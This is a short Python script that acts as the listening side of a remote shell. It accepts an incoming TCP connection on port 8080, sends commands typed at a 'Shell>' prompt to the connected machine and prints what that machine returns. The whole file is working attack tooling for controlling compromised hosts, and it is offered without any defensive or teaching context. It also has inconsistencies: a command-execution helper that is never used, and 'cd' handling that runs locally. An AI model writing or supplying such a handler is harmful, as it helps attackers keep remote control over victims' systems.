import socket
import subprocess
import os

def execute_command(command):
    try:
        return subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        return str(e)

def change_directory(path):
    try:
        os.chdir(path)
        return os.getcwd()
    except FileNotFoundError:
        return "[Error] Directory not found"

def main():
    server = socket.create_server(("0.0.0.0", 8080))
    print("[+] Listening for incoming TCP connection on port 8080")
    
    client_socket, client_address = server.accept()
    print(f"[+] Connection from {client_address}")
    
    while True:
        command = input("Shell> ")
        if command.lower() in ["exit", "quit"]:
            break
        
        if command.startswith("cd "):
            new_path = command[3:].strip()
            response = change_directory(new_path)
        else:
            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
        
        print(response)
    
    client_socket.close()
    server.close()

if __name__ == "__main__":
    main()
